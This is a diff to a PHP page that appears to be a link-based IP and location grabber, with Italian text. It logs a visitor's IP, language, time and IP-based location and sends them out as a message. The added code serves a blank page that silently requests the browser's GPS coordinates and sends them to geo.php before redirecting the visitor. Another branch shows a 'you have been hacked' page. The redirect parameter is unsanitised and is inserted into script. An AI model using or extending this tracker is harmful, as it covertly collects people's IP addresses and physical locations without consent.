@@ -25,7 +25,7 @@ require('config.php');
 require('ipapi.php');
 require('tinyurlapi.php');
 
-if ($_GET['redir']) header('Location: '.$_GET['redir']);
+if ($_GET['redir'] && empty($_GET['geox']) ) header('Location: '.$_GET['redir']);
 
 $ip = $_SERVER['REMOTE_ADDR'];
 $lid = $_GET['id'];
@@ -42,7 +42,7 @@ Lingua: $accept
 Giorno & Ora : $today
 Url: $script_url
 TinyUrl: $tinyurl
-ID: $lid
+ID : $lid
 ";
 
 $res = get_ip_info($ip);
@@ -66,10 +66,29 @@ if ($res !== null){
         (int)$first_message['result']['message_id']
 	);
 }
-?>
-<html>
+
+if ( $_GET['geox'] == 'true') {
+	echo '<html>
+    <head>
+    	<script>
+          (function getLocation() {
+              if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position){
+                  var lat = position.coords.latitude;
+                  var lon = position.coords.longitude;
+				  window.location="geo.php?lat="+lat+"&lon="+lon+"&mid='.$first_message['result']['message_id'].'"+"&redir='.$_GET['redir'].'";                
+               });
+              }
+          })();
+        </script>
+    </head>
+    <body>
+    </body>
+    <html>';
+} else {
+	echo '<html>
   <head>
-  	<title>Attacco hacker</title>
+  	<title></title>
   </head>
   <body>
   	<div align="center" style="background-color:black">
@@ -77,7 +96,7 @@ if ($res !== null){
   	<h1>SEI STATO HACKERATO: </h1>
     <hr width="50%" />
     <h2>ecco i tuoi dati: </h2>
-    <?php echo nl2br($message); ?>
+    '.nl2br($message).'
     <hr width="50%"/>
     <h3>Inviaci un commento</h3>
     <form action="comment.php" method="get"> 
@@ -88,6 +107,9 @@ if ($res !== null){
     </font>
     </div>
   </body>
-</html>
+</html>';
+}
+?>
+
 
 
